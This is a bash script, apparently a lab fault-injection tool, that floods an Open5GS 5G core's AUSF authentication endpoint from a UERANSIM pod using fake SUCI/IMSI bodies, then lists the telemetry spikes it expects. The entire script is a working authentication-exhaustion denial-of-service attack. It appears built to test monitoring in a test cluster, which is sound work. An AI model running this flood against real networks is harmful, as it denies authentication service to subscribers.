#!/usr/bin/env bash
# inject_auth_exhaustion.sh
# ─────────────────────────
# Injects an Authentication Exhaustion attack by flooding the AUSF's
# /nausf-auth/v1/ue-authentications endpoint with concurrent POST requests.
#
# Each request forces AUSF to:
#   1. Parse + validate the SUCI/SUPI identity
#   2. Query UDM (/nudm-ueau) for auth vectors
#   3. Allocate an auth session and generate a 5G-AKA challenge
#   4. Store partial auth state pending UE response (that never arrives)
#
# This exhausts both AUSF session slots and UDM crypto/query capacity,
# and cascades net_rx spikes onto UDM and AUSF simultaneously.
# Based on: 3GPP TR 33.926 §6.4 (AUSF availability threats)
#
# Usage: ./inject_auth_exhaustion.sh [concurrency] [duration_seconds]
# Default: 20 concurrent workers, 300 seconds

set -euo pipefail

CONCURRENCY=${1:-20}
DURATION=${2:-300}

# Dynamically resolve AUSF ClusterIP — robust across cluster recreates
AUSF_IP=$(kubectl get svc -n open5gs open5gs-ausf-sbi \
    -o jsonpath='{.spec.clusterIP}' 2>/dev/null || echo "")

if [[ -z "$AUSF_IP" ]]; then
    echo "ERROR: Could not resolve AUSF ClusterIP. Is the cluster running?"
    echo "  kubectl get svc -n open5gs open5gs-ausf"
    exit 1
fi

AUSF_SBI="http://${AUSF_IP}:7777"
ENDPOINT="${AUSF_SBI}/nausf-auth/v1/ue-authentications"

echo "[auth-exhaustion] Target:      ${ENDPOINT}"
echo "[auth-exhaustion] Concurrency: ${CONCURRENCY} workers"
echo "[auth-exhaustion] Duration:    ${DURATION}s"
echo "[auth-exhaustion] Protocol:    HTTP/2 cleartext (h2c)"
echo "[auth-exhaustion] Effect:      AUSF session exhaustion + UDM auth-vector flood"
echo ""

# Find a pod inside the cluster to run from
UE_NS=$(kubectl get pods --all-namespaces | grep -i "ueransim-ues" | grep -v "Terminating" | head -1 | awk '{print $1}')
UE_POD=$(kubectl get pods --all-namespaces | grep -i "ueransim-ues" | grep -v "Terminating" | head -1 | awk '{print $2}')

if [[ -z "$UE_POD" ]]; then
    echo "ERROR: Could not find ueransim-ues pod"
    exit 1
fi
echo "[auth-exhaustion] Running flood from pod: $UE_POD ($UE_NS)"

# JSON body for nausf-auth UE authentication initiation (3GPP TS 29.509)
# SUCI format: suci-<protectionScheme>-<MCC>-<MNC>-<routingInd>-<homeNetworkPublicKeyId>-<schemeOutput>
# Using MCC=999, MNC=70 (matching Open5GS test subscriber DB)
# Varying the scheme output per request keeps each as a distinct auth attempt
AUTH_BODY='{
  "supiOrSuci": "suci-0-999-70-0000-0-0-IMSI",
  "servingNetworkName": "5G:mnc070.mcc999.3gppnetwork.org",
  "ausfInstanceId": "00000000-0000-0000-0000-000000000001"
}'

FLOOD_SCRIPT=$(cat <<'INNER'
#!/bin/sh
ENDPOINT="$1"
CONCURRENCY="$2"
DURATION="$3"
BODY_TEMPLATE="$4"

END_TIME=$(( $(date +%s) + DURATION ))
WAVE=0

while [ $(date +%s) -lt $END_TIME ]; do
    REMAINING=$(( END_TIME - $(date +%s) ))
    WAVE=$(( WAVE + 1 ))
    echo "[wave $WAVE] ${REMAINING}s remaining — launching $CONCURRENCY auth requests..."

    i=0
    while [ $i -lt $CONCURRENCY ]; do
        # Vary the SUCI scheme output (last field) per request to create unique sessions
        FAKE_IMSI=$(printf '%015d' $((WAVE * 100 + i)))
        BODY=$(echo "$BODY_TEMPLATE" | sed "s/IMSI/$FAKE_IMSI/g")
        curl -s --max-time 3 --http2-prior-knowledge \
            -X POST "$ENDPOINT" \
            -H "Content-Type: application/json" \
            -d "$BODY" \
            -o /dev/null 2>/dev/null &
        i=$(( i + 1 ))
    done
    wait
    sleep 1
done

echo "[auth-exhaustion] Done — ran $WAVE waves over ${DURATION}s"
INNER
)

kubectl exec -n "$UE_NS" "$UE_POD" -- sh -c "$FLOOD_SCRIPT" -- \
    "$ENDPOINT" "$CONCURRENCY" "$DURATION" "$AUTH_BODY"

echo ""
echo "[auth-exhaustion] Flood complete. Expected telemetry:"
echo "  - Prometheus: AUSF cpu_rate + net_rx_rate spike; UDM net_rx_rate spike"
echo "  - Loki: flood of AUSF auth initiation logs + UDM nudm-ueau lookup logs"
echo "  - Jaeger: high volume AUSF→UDM SBI spans (nudm-ueau)"
